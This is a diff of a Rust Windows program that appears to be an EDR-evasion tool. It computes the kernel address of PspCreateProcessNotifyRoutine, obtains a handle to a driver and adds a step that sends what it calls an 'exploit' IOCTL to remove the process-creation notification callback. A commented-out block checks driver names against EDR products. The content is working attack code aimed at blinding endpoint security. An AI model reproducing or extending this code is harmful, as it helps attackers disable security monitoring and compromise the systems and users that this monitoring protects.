@@ -1,6 +1,6 @@
 use std::{thread, time};
-use std::ffi::c_void;
 
+use winapi::ctypes::c_void; 
 use winapi::shared::minwindef::{DWORD};     /// Can add LPVOID, etc.
 //use winapi::um::handleapi::{CloseHandle};
 
@@ -91,13 +91,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
-    // Get full addresses for NT kernel objects
-    let process_create_notify_base = {
-        (nt_base as usize).wrapping_add(nt_offsets.psp_create_process_notify_routine as usize)
-            as *mut c_void
-    };
-
-    println!("[>] PspCreateProcessNotifyRoutine is at: {:?}", process_create_notify_base);
 
     /* -=-= TESTING: Checking the module base address for driver name + if matching EDR
     let addr: u64 = 0xfffff807200581e0;
@@ -130,7 +123,23 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("[+] Got driver handle: {:?}", h_drv);
 
     // Remove Process Creation Notification callback
+    let process_create_notify_base = {
+        (nt_base as u64).wrapping_add(nt_offsets.psp_create_process_notify_routine as u64)
+    };
+    println!("[>] PspCreateProcessNotifyRoutine is at: 0x{:16x}", process_create_notify_base);
 
+    println!("[*] Sending exploit to remove process creation notification.");
+    unsafe {
+        xp_utils::send_ioctl_to_driver(
+            h_drv, 
+            process_create_notify_base + 0x20,
+            0x8
+        );
+    }
+
+
+
+    km_utils::get_thread_info();
 
 
 
